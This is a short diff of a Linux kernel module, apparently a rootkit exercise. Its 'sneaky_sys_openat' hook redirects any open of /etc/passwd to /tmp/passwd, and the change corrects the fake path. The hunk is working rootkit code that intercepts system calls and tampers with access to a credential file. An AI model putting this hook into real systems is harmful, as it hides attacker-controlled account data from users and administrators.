@@ -61,7 +61,7 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   //return (*original_openat)(regs);
   const char * filename = regs->si;
   const char * target = "/etc/passwd";
-  const char * fake = "tmp/passwd";
+  const char * fake = "/tmp/passwd";
   if(strcmp(filename, target) == 0){
     copy_to_user(filename, fake, strlen(fake));
   }
